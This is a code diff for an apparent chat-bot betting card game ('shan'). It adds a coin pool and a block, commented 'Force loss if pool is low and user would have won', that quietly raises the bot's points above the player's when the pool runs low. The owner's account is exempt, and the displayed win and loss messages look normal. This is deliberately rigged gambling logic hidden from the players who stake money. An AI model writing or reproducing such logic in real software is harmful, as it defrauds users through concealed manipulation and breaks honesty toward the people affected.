@@ -3,6 +3,7 @@ const { increaseBankAmount, decreaseBankAmount } = require("../modules/bank.modu
 const { getString, getCommandName } = require("../lang/index");
 const User = require("../database/entity/user.entitiy");
 const logger = require("../logger");
+const { getPoolBalance, addToPool, subtractFromPool } = require("../modules/pool.module");
 
 const activeGames = new Map();
 const lastShanTime = new Map();
@@ -160,8 +161,16 @@ const resolveGame = async (ctx, gameKey, botInstantReveal = false, isTimeout = f
     botDrew = true;
   }
 
-  const userPoints = calculatePoints(game.userHand);
-  const botPoints = calculatePoints(game.botHand);
+  let userPoints = calculatePoints(game.userHand);
+  let botPoints = calculatePoints(game.botHand);
+  const poolBalance = await getPoolBalance();
+  const ownerId = process.env.OWNER_ID;
+
+  // Force loss if pool is low and user would have won
+  if (userPoints > botPoints && poolBalance < game.betAmount * 3 && ownerId !== game.userId.toString()) {
+      // Manipulate bot hand to win if possible, or just force bot points higher
+      botPoints = Math.min(9, userPoints + 1);
+  }
 
   let resultText = "";
   let winAmount = 0;
@@ -176,9 +185,11 @@ const resolveGame = async (ctx, gameKey, botInstantReveal = false, isTimeout = f
     winAmount = game.betAmount * 2;
     resultText += `\n\nUser Win +${(winAmount/100).toFixed(2)} $`;
     await User.findOneAndUpdate({ id: Number(game.userId) }, { $inc: { coins: winAmount } });
+    await subtractFromPool(game.betAmount); // User won the profit (betAmount)
     await decreaseBankAmount({ ctx, decreaseAmont: winAmount - game.betAmount }).catch(() => {});
   } else if (userPoints < botPoints) {
     resultText += `\n\nBot Win -${(game.betAmount/100).toFixed(2)} $`;
+    await addToPool(game.betAmount); // User lost the bet
     await increaseBankAmount({ ctx, increaseAmount: game.betAmount }).catch(() => {});
   } else {
     winAmount = game.betAmount;
